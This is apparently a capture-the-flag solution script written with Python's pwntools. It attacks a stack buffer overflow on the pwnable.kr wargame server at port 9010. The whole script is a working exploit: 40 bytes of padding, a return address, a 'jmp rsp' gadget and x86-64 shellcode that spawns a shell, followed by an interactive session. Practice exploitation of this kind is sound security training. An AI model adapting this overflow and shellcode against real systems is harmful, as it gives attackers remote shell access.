from pwn import *

payload = 'A'*40
ret_addr = 0x6020a0
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"\
    "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p = remote('pwnable.kr', 9010)
p.sendline(asm("jmp rsp",arch='amd64',os='linux'))
p.sendline('1')
p.sendline(payload + p64(ret_addr) + shellcode )
p.interactive()

